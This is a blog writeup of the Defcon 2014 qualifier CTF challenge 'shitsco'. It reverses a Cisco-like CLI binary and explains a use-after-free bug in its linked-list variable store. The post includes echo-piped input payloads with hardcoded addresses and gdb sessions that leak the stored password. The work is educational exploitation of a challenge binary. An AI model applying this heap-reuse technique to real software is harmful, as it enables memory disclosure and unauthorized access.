---
id: 1910
title: 'Defcon Quals writeup: Shitsco (use-after-free vuln)'
date: '2014-05-20T16:20:10-05:00'
author: 'Ron Bowes'
layout: revision
guid: 'https://blog.skullsecurity.org/2014/1909-revision-v1'
permalink: '/?p=1910'
---

Hey folks,

Apparently this blog has become a CTF writeup blog! Hopefully you don't mind, I still try to keep all my posts educational.

Anyway, this is the first of two writeups for the Defcon CTF Qualifiers (2014). I only completed two levels, both of which were binary reversing/exploitation! This particular level was called "shitsco", and was essentially a use-after-free vulnerability.

## The setup

Based on the name, it'll be no surprise that the program itself looks like a Cisco router UI. You run the executable, and it prints stuff to stdout:

```

$ ./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ ?
==========Available Commands==========
|enable                               |
|ping                                 |
|tracert                              |
|?                                    |
|shell                                |
|set                                  |
|show                                 |
|credits                              |
|quit                                 |
======================================
Type ? followed by a command for more detailed information
```

You can do a lot of interesting stuff, but the most interesting things are:

- enable - prompts for a password to elevate privileges (and matches it to the password in /home/shitsco/password, which is read when the program executes)
- set - sets and unsets named variables
- show - shows variables that have been set
- flag - a hidden command that can be run after 'enable' that prints out the flag

I started by reversing a lot of the commands. I won't go into too much detail on the assembly here, but suffice to say that many of the commands are boring ("credits", "quit", "shell", and "?" for example), and some are somewhat interesting ("ping" and "tracert", for example, let you provide a single command-line argument to the ping and traceroute programs respectively). But since exec() was being used, there was no shell injection issue.

One of my first suspicions was the set/unset functionality, because heap overflow / linked list issues are [so](/2014/ghost-in-the-shellcode-gitsmsg-pwnage-299) damn [common](/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug). It turns out that wasn't the issue, but the issue was indeed in the set/unset functionality!

## Playing with the binary

The first thing I noticed was weird behaviour when I set and unset stuff. Here is how it should look:

```

$ ./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

$ set a aaa
$ set b bbb
$ set c ccc
$ show
a: aaa
b: bbb
c: ccc
$ set b <-- Unset 'b'
$ show
a: aaa
c: ccc
$ set c <-- Unset 'c'
$ show
a: aaa
$ set d ddd
$ set e eee
$ show
a: aaa
d: ddd
e: eee
```

Note that as we add to the list, they are sorted top to bottom. When you remove them from the list, they are no longer shown (obviously). When you add more stuff to the list, it keeps adding to the bottom. That's expected!

But look at what happens if we free 'a' and add something else:

```

$ ./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

$ set a aaa
$ set b bbb
$ show
a: aaa
b: bbb
$ set a
$ show
b: bbb
$ set c ccc
$ show
c: ccc
b: bbb
```

Wait a minute... how did 'ccc' wind up at the top of the list? What happens if we add something else?

```

$ set d ddd
$ show
c: ccc
b: bbb
d: ddd
```

It adds to the... end?

We're starting to see some odd behaviour! Let's look at another weird case:

```

$ ./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

$ set a aaa
$ set b bbb
$ set c ccc
$ show
a: aaa
b: bbb
c: ccc
$ set c 321 <-- edit 'c'
$ show
a: aaa
b: bbb
c: 321
$ set a
$ show
b: bbb
c: ccc
$ set b 123 <-- edit 'b'.. or not?
$ show
b: 123
b: bbb
c: ccc
```

We were able to end up with two 'b' entries... that's not right!

I'll show you one more odd example:

```

$ ./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

$ set a aaa
$ set b bbb
$ set c ccc
$ set a
$ set b
$ set c
$ show
?: (null)
$ show
d: ddd
?: (null)
$ set e eee
$ show
d: ddd
e: eee
e: eee
e: eee
e: eee
e: eee
...forever
```

That's the weirdest one! We got a 'null' in the list, and we wound up in an infinite loop!

Something I should have noticed, but didn't at the time, was that this odd behaviour only happens when a) you remove the first element, and b) there was at least one element after it. Quite honestly, I was never able to reliably figure out how to trigger the odd behaviour till I started reversing.

## The vulnerability

Before we get to the actual vulnerability, let's talk a bit about the architecture of the code.

Without whipping out the disassembler just yet, we can assume that this is implemented with a linked list. Why? Because we were able to get an infinite loop, which means something is pointing back at itself.

In actuality, the code bears out. It is indeed a linked list (a doubly-linked list, in fact) with four fields:

```
<pre id="vimCodeElement">
<span class="Type">typedef</span> <span class="Type">struct</span> {
  <span class="Type">char</span> *name;
  <span class="Type">char</span> *value;
  <span class="Type">void</span> *prev;
  <span class="Type">void</span> *next;
}
```

When you add a new entry, there is only one possibility: it walks the list to the end, then sets the 'next' pointer appropriately.

When you remove an entry, there are three possibilities: the end of the list, the middle, or the start. The code for doing this is extremely confusing, but the three things that can happen are:

End of the list: it frees it and sets the previous pointer's 'next' to NULL. Note that if there's only one entry, this always happens!

Middle of the list: it frees it, and sets the previous next and next previous pointers appropriately

Beginning of the list: it frees it, and fails to set the 'previous' pointer properly. **The *head* pointer still points to the freed memory**! That leads directly to a **use after free** vulnerability! Remember that in order for this code to runs, there has to be at least one more entry after this one.

When we remove the first entry (freeing 16 bytes) then add a new one (which requires 16 bytes), the new entry just happens to get allocated in the same memory where the first entry used to be, and everything works just fine. However, if 16 bytes gets allocated in the interim, and we control those bytes, it means we can fully control the 'head' entry!

A couple gotchas:

- The list has to be filled then emptied (from the front) before you can add an 'evil' entry
- The two entries that will be replaced work better if they are each 16 bytes long

Both of these I discovered by trial and error, and are simply the nature of how the malloc()s and free()s are ordered, as well as the size of the entry structure (which is also 16 bytes). I'm sure there are other ways to arrange things!

## The exploit

Let's first try a proof-of-concept: we'll make it allocate 16 'A's, which in theory should take the place of the freed structure:

```

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ set a aaaaaaaaaaaaaaaa
$ set b bbbbbbbbbbbbbbbb
$ set a
$ set b
$ set c AAAAAAAAAAAAAAAA
$ show
c: AAAAAAAAAAAAAAAA
Segmentation fault
```

Beautiful! We added 'aaaaaaaaaaaaaaaa' and 'bbbbbbbbbbbbbbbb', then freed them both (as I mentioned earlier, we have to empty out the list). Then we add 'c' with the value of 'AAAAAAAAAAAAAAAA', which should take over the list entry for 'a'. We, therefore, expect that the name, the value, the previous, and the next pointers all point to 0x41414141, so it's crashing when trying to dereference one of them.

And sure enough, we can verify with a debugger (I used a string with four different values so we can see what's happening):

```

$ gdb -q ./shitsco
Reading symbols from /home/ron/defcon-ctf-2014/shitsco/shitsco...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/ron/defcon-ctf-2014/shitsco/./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ set a aaaaaaaaaaaaaaaa
$ set b bbbbbbbbbbbbbbbb
$ set a
$ set b
$ set c AAAABBBBCCCCDDDD
$ show
c: AAAABBBBCCCCDDDD

Program received signal SIGSEGV, Segmentation fault.
<span class="Constant">0x08048e98</span> in ?? ()
(gdb) x/i <span class="Identifier">$eip</span>
=> <span class="Constant">0x8048e98</span>:   mov    eax,DWORD PTR [ebx]
(gdb) <span class="Constant">print</span>/x <span class="Identifier">$ebx</span>
$1 = <span class="Constant">0x43434343</span>
```

Excellent! It's crashing when reading the 'next' pointer! That means we need to construct an appropriate struct in memory that we can point to. Or... we can just use the 'head' entry, which happens to be at 0x0804C36C. This will cause an infinite loop, but I'm okay with that.

I'm sick of typing manually, plus we want to start using some non-ascii characters, so let's do it all on the commandline:

```

$ echo -ne <span class="Constant">'set a aaaaaaaaaaaaaaaa\nset b bbbbbbbbbbbbbbbb\nset a\nset b\nset c AAAABBBB\x6c\xc3\x04\x08DDDD\nshow\n'</span> | ./shitsco

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ $ $ $ $ $ c: AAAABBBBlDDDD
Segmentation fault (core dumped)
```

Using a debugger to check out the crash:

```

$ gdb -q ./shitsco ./core
Reading symbols from /home/ron/defcon-ctf-2014/shitsco/shitsco...(no debugging symbols found)...done.

Core was generated by `./shitsco'.
Program terminated with signal <span class="Constant">11</span>, Segmentation fault.
<span class="Comment">#0  0xf75e2b75 in vfprintf () from /lib32/libc.so.6</span>
(gdb) x/i <span class="Identifier">$eip</span>
=> <span class="Constant">0xf75e2b75</span> <vfprintf+<span class="Constant">21189</span>>: repnz scas al,BYTE PTR es:[edi]
(gdb) <span class="Constant">print</span>/x <span class="Identifier">$edi</span>
$1 = <span class="Constant">0x42424242</span>
```

We can see from this that it crashed in vfprintf() while reading 0x42424242 - that's "BBBB". Sweet!

Now the last step: I want to read the password, so I can use 'enable'. So I set the commandline to 0x0804C3A0, which is the address of the password in memory. I also pipe into "head" because it causes an infinite loop:

```

$ echo -ne 'set a aaaaaaaaaaaaaaaa\nset b bbbbbbbbbbbbbbbb\nset a\nset b\nset c AAAA\xa0\xc3\x04\x08\x6c\xc3\x04\x08DDDD\nshow\n' | ./shitsco | head -n12

 oooooooo8 oooo        o88    o8
888         888ooooo   oooo o888oo  oooooooo8    ooooooo     ooooooo
 888oooooo  888   888   888  888   888ooooooo  888     888 888     888
        888 888   888   888  888           888 888         888     888
o88oooo888 o888o o888o o888o  888o 88oooooo88    88ooo888    88ooo88

Welcome to Shitsco Internet Operating System (IOS)
For a command list, enter ?
$ $ $ $ $ $ c: AAAA?lDDDD
: this_is_the_password
```

We got the password!! From there, all you have to do is use 'enable', then 'flag' to get the flag.

## Summary

Essentially, this was a use-after-free bug. If you de-allocated the first entry, the 'head' pointer wasn't updated and still pointed at freed memory. If you can allocate new memory of the same size, it'll take the place of the head structure and give the attacker some control over the name, value, next, and previous pointers. In theory, we could almost certainly use this for an arbitrary memory write, but in the context of this challenge it's enough to read the password from memory.

This is the first time I've seen a use-after-free issue in a CTF, so it was really cool to see it!